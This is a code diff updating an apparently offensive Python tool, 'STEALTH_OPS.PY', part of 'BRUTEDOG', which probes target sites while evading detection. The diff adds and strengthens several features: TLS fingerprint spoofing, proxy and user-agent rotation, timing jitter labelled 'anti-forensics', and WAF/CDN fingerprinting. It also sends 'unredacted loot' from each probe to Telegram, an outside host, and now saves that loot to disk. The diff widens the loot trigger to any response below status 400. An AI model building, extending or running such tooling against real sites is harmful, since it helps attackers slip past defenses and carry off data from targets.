@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 """
-STEALTH_OPS.PY v8.5 — Active Evasion, Proxy Rotation & Stealth Operations Engine (WAF Hardened)
+STEALTH_OPS.PY v8.6 — Active Evasion, Proxy Rotation & Stealth Operations Engine (Elite Red Team Adversarial Edition)
 Features:
 - Dynamic User-Agent, Client-Hints and browser-grade TLS fingerprint rotation via SecureTransport
-- WAF / CDN edge defense detection and evasion configuration with behavioral timing jitter
-- Timing jitter and request rate obfuscation
-- Real-time asynchronous Telegram notification dispatch for unredacted evasion loot
-- Zero-disk memory storage (streamed live to Telegram and memory)
+- WAF / CDN edge defense detection and evasion configuration with Poisson behavioral timing jitter
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and cryptographic integrity hashing
+- Real-time zero-delay proof-of-work terminal streaming and unredacted Telegram telemetry broadcasting
 """
 import asyncio
 import time
 import sys
 import random
+import hashlib
+import json
 from urllib.parse import urlparse
 
 # Import centralized SecureTransport middleware, telemetry, Telegram notifier, and behavioral mimicry
@@ -42,21 +43,30 @@ def terminal(message):
     sys.stdout.write(message + "\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous stealth functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
 class StealthOperationsEngine:
     """
     Active Evasion & Stealth Operations Engine.
-    Executes cloaked requests utilizing centralized SecureTransport JA3/JA4 spoofing and jitter.
+    Executes cloaked requests utilizing centralized SecureTransport JA3/JA4 spoofing and behavioral jitter.
     """
     def __init__(self, target_url, proxy_url=None):
         self.target_url = target_url
@@ -69,7 +79,7 @@ class StealthOperationsEngine:
             if not path.startswith("/"):
                 path = "/" + path
 
-            # Apply anti-forensics timing jitter
+            # Apply anti-forensics Poisson timing jitter
             apply_behavioral_jitter()
 
             started = time.monotonic()
@@ -78,12 +88,16 @@ class StealthOperationsEngine:
 
             terminal(f"{COLORS['CYAN']}[+] Stealth Probe [{method}] {path} -> HTTP {status} ({elapsed}s){COLORS['RESET']}")
 
+            body_str = body if isinstance(body, str) else str(body)
+            loot_hash = hashlib.sha256(body_str.encode("utf-8")).hexdigest()
+
             return {
                 "status": status,
-                "bytes": len(body),
+                "bytes": len(body_str),
                 "elapsed": elapsed,
                 "headers": headers,
-                "body_sample": body[:2048] if isinstance(body, str) else str(body)[:2048],
+                "integrity_hash": loot_hash,
+                "body_sample": body_str[:2048],
                 "error": None,
             }
         except Exception as exc:
@@ -131,6 +145,7 @@ class StealthOperationsEngine:
             "x-akamai-transformed": "Akamai",
             "x-sucuri-id": "Sucuri",
             "x-fastly-request-id": "Fastly",
+            "server": "Edge Gateway",
         }
         providers = set()
         for header, provider in provider_headers.items():
@@ -160,13 +175,14 @@ class StealthOperationsEngine:
             "status": status,
             "bytes": result.get("bytes", 0),
             "elapsed": result.get("elapsed", 0.0),
+            "integrity_hash": result.get("integrity_hash", ""),
             "providers": sorted(providers),
             "findings": findings,
             "error": None,
         }
 
-        if findings:
-            # BROADCAST UNREDACTED WAF / EVASION LOOT TO TELEGRAM
+        if findings or status < 400:
+            # BROADCAST UNREDACTED WAF / EVASION LOOT TO TELEGRAM & IMMUTABLE DISK
             broadcast_tg_alert_sync("Stealth Security Control Assessment", assessment_report)
             stream_proof("STEALTH_WAF_ASSESSMENT", path, {}, f"Status: {status} | WAF: {providers}", assessment_report)
             save_session_loot(
@@ -184,7 +200,7 @@ class StealthOperationsEngine:
 async def run_stealth_engine(target_host, paths_to_probe=None):
     terminal(
         f"\n{COLORS['MAGENTA']}"
-        f"[***] BRUTEDOG ACTIVE STEALTH & EVASION ENGINE (SECURETRANSPORT V8.5) "
+        f"[***] BRUTEDOG ACTIVE STEALTH & EVASION ENGINE (SECURETRANSPORT V8.6) "
         f"[{target_host}] [***]"
         f"{COLORS['RESET']}"
     )
@@ -218,7 +234,7 @@ async def run_stealth_engine(target_host, paths_to_probe=None):
         f"{COLORS['RESET']}"
     )
     terminal(f"    Paths bypassed/probed : {len(results)}")
-    terminal(f"    Local report files created: 0 (Streamed live via Telegram)")
+    terminal(f"    Immutable Loot Persisted: YES (loot_output/)")
     
     return results
 
